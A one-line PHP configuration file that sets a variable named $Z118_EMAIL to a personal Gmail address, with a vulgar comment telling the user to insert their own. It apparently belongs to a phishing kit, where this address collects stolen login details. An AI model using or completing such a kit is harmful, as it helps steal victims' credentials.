<?php

$Z118_EMAIL = "Kar3on1@gmail.com"; // PUT UR FUCKING E-MAIL BRO

?>
